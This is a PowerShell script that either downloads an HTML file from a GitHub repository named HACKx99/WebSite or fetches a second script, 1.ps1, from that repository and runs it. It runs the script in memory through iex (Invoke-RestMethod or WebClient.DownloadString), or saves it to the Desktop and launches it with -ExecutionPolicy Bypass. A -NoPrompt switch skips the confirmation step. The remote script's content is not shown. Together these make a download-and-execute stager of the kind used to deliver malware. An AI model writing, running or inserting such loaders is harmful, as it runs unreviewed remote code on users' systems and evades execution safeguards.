<#
.SYNOPSIS
  Main script to download 1.html and optionally fetch/execute 1.ps1 from GitHub.

.DESCRIPTION
  Modes:
    - DownloadHtml        : Download 1.html to Desktop (default)
    - IrmInvoke           : Fetch 1.ps1 via Invoke-RestMethod and execute in memory (iex)
    - WebClientInvoke     : Fetch 1.ps1 via WebClient DownloadString and execute in memory (iex)
    - DownloadThenRunPs   : Download 1.ps1 to Desktop and run it with -ExecutionPolicy Bypass
#>

param(
    [ValidateSet('DownloadHtml','IrmInvoke','WebClientInvoke','DownloadThenRunPs')]
    [string] $Mode = 'DownloadHtml',

    [switch] $Force,       # overwrite without prompt
    [switch] $NoPrompt     # skip prompts for IEX (dangerous)
)

# --- Configuration ---
$rawHtmlUrl = 'https://raw.githubusercontent.com/HACKx99/WebSite/main/1.html'
$rawPsUrl   = 'https://raw.githubusercontent.com/HACKx99/WebSite/main/1.ps1'
$desktop    = [Environment]::GetFolderPath('Desktop')
$htmlName   = '1.html'
$psName     = '1.ps1'
$htmlPath   = Join-Path $desktop $htmlName
$psPath     = Join-Path $desktop $psName

# Force TLS 1.2 (GitHub requires modern TLS)
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Write-Info { param($m) Write-Host "[*] $m" -ForegroundColor Cyan }
function Write-Err  { param($m) Write-Host "[!] $m" -ForegroundColor Red }

# --- Download helpers ---
function Download-File {
    param(
        [string] $Url,
        [string] $OutFile,
        [switch] $UseRestMethod      # when true, use Invoke-RestMethod -> Out-File (text)
    )

    try {
        if ($UseRestMethod) {
            Write-Info "Downloading (Invoke-RestMethod) -> $OutFile"
            $content = Invoke-RestMethod -Uri $Url -ErrorAction Stop
            $content | Out-File -FilePath $OutFile -Encoding UTF8 -Force
        } else {
            Write-Info "Downloading (Invoke-WebRequest) -> $OutFile"
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -ErrorAction Stop
        }
        Write-Info "Saved: $OutFile"
        return $true
    } catch {
        Write-Err "Download failed: $($_.Exception.Message)"
        return $false
    }
}

# --- Remote-execute helpers ---
function Invoke-RemoteScript-InMemory_WebClient {
    param([string] $Url)
    Write-Info "Fetching remote script (WebClient) and executing in memory..."
    try {
        $wc = New-Object System.Net.WebClient
        $scriptText = $wc.DownloadString($Url)
        if (-not $NoPrompt) {
            Write-Host "About to execute remote script from $Url. Proceed? (Y/N)" -NoNewline
            $ans = Read-Host
            if ($ans -notmatch '^[Yy]') { Write-Info "Cancelled by user."; return }
        }
        iex $scriptText
    } catch {
        Write-Err "Failed to fetch/execute: $($_.Exception.Message)"
    }
}

function Invoke-RemoteScript-InMemory_Irm {
    param([string] $Url)
    Write-Info "Fetching remote script (Invoke-RestMethod) and executing in memory..."
    try {
        $scriptText = Invoke-RestMethod -Uri $Url -ErrorAction Stop
        if (-not $NoPrompt) {
            Write-Host "About to execute remote script from $Url. Proceed? (Y/N)" -NoNewline
            $ans = Read-Host
            if ($ans -notmatch '^[Yy]') { Write-Info "Cancelled by user."; return }
        }
        iex $scriptText
    } catch {
        Write-Err "Failed to fetch/execute: $($_.Exception.Message)"
    }
}

function Download-Then-Run {
    param([string] $Url, [string] $LocalPath)
    Write-Info "Downloading script to $LocalPath"
    if (Test-Path $LocalPath) {
        if (-not $Force) {
            $ans = Read-Host "File $LocalPath exists. Overwrite? (Y/N)"
            if ($ans -notmatch '^[Yy]') { Write-Info "Aborted by user."; return }
        } else {
            Remove-Item -LiteralPath $LocalPath -Force -ErrorAction SilentlyContinue
        }
    }
    if (Download-File -Url $Url -OutFile $LocalPath -UseRestMethod:$false) {
        Write-Info "Executing $LocalPath with Bypass execution policy..."
        try {
            PowerShell -ExecutionPolicy Bypass -File $LocalPath
        } catch {
            Write-Err "Execution failed: $($_.Exception.Message)"
        }
    }
}

# --- Main logic ---
switch ($Mode) {
    'DownloadHtml' {
        if (Test-Path $htmlPath) {
            if (-not $Force) {
                $answer = Read-Host "File $htmlPath already exists. Overwrite? (Y/N)"
                if ($answer -notmatch '^[Yy]') { Write-Info "Aborted: not overwriting."; break }
            } else {
                Remove-Item -LiteralPath $htmlPath -Force -ErrorAction SilentlyContinue
            }
        }
        Download-File -Url $rawHtmlUrl -OutFile $htmlPath -UseRestMethod:$false
        break
    }

    'IrmInvoke' {
        # Fetch with Invoke-RestMethod then iex
        Invoke-RemoteScript-InMemory_Irm -Url $rawPsUrl
        break
    }

    'WebClientInvoke' {
        # Fetch with WebClient.DownloadString then iex
        Invoke-RemoteScript-InMemory_WebClient -Url $rawPsUrl
        break
    }

    'DownloadThenRunPs' {
        Download-Then-Run -Url $rawPsUrl -LocalPath $psPath
        break
    }

    default {
        Write-Err "Unknown mode: $Mode"
    }
}

Write-Info "Done. Mode used: $Mode"
